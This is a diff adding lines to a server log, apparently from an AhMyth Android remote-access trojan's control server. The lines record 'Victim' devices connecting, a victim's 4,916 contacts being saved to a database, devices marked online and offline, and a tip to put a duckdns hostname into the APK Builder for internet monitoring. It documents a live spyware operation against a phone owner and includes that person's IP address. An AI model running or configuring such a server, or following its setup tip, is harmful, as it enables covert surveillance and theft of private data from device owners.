@@ -426,3 +426,13 @@
 [2026-02-08T05:46:51.641Z] 👥 Saving 4916 contacts to database for e702c6c3ca97f8de
 [2026-02-08T05:49:50.424Z] Victim disconnected: e702c6c3ca97f8de
 [2026-02-08T05:49:50.432Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T05:51:14.627Z] New Socket.IO connection! ID: /#GHEcM8n9gFKG628FAAAC IP: ::ffff:217.138.220.122
+[2026-02-08T05:51:14.628Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T05:51:14.638Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T05:51:54.634Z] Victim disconnected: e702c6c3ca97f8de
+[2026-02-08T05:51:54.641Z] 💾 Victim marked offline in database: e702c6c3ca97f8de
+[2026-02-08T05:52:26.658Z] New Socket.IO connection! ID: /#KQxPX_8yq5QrOD3gAAAD IP: ::ffff:217.138.220.122
+[2026-02-08T05:52:26.658Z] Query params: {"model":"M2101K6G","EIO":"3","id":"e702c6c3ca97f8de","transport":"polling","release":"13","manf":"Xiaomi"}
+[2026-02-08T05:52:26.667Z] 💾 Victim saved to database: e702c6c3ca97f8de
+[2026-02-08T05:55:09.992Z] Server is now listening on port: 42474
+[2026-02-08T05:55:09.992Z] IMPORTANT: Use ahmythserver.duckdns.org in APK Builder for INTERNET monitoring
